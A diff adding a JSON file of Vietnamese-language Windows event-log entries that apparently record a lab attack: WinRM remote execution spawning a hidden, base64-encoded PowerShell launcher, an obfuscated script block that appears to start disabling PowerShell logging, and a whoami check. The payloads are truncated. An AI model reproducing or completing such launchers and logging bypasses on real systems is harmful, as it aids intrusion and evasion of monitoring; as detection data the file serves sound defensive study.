@@ -1,0 +1,8 @@
+{
+ "E1": "21:09:09 workstation6: đăng nhập thành công kiểu 3 (qua mạng) của THESHIRE.LOCAL\\pgustavo, LogonId 0x2da8840, IP nguồn -",
+ "E2": "21:09:09 workstation6: svchost.exe tạo tiến trình wsmprovhost.exe (PID 9036), tài khoản THESHIRE\\pgustavo, LogonId 0x2da8840; lệnh: C:\\windows\\system32\\wsmprovhost.exe -Embedding",
+ "E3": "21:09:12 workstation6: wsmprovhost.exe tạo tiến trình powershell.exe (PID 10116), tài khoản THESHIRE\\pgustavo, LogonId 0x2da8840; lệnh: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAcwBJAG8AbgAuAE0A… [rút gọn, 5164 ký tự]",
+ "E4": "21:09:13 workstation6: PowerShell PID 10116 chạy script block; mở đầu: If($PSVErSioNTaBlE.PSVERsIon.MAJoR -ge 3){$43DE2=[REF].AssEmbly.GeTTYPE('System.Management.Automation.Utils').\"GetFIe`Ld\"('cachedGroupPolicySettings','N'+'onPub… [rút gọn, 1910 ký tự]",
+ "E5": "21:09:13 workstation6: powershell.exe tạo tiến trình conhost.exe (PID 3384), tài khoản THESHIRE\\pgustavo, LogonId 0x2da8840; lệnh: \\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+ "E6": "21:09:40 workstation6: powershell.exe tạo tiến trình whoami.exe (PID 3148), tài khoản THESHIRE\\pgustavo, LogonId 0x2da8840; lệnh: \"C:\\windows\\system32\\whoami.exe\""
+}
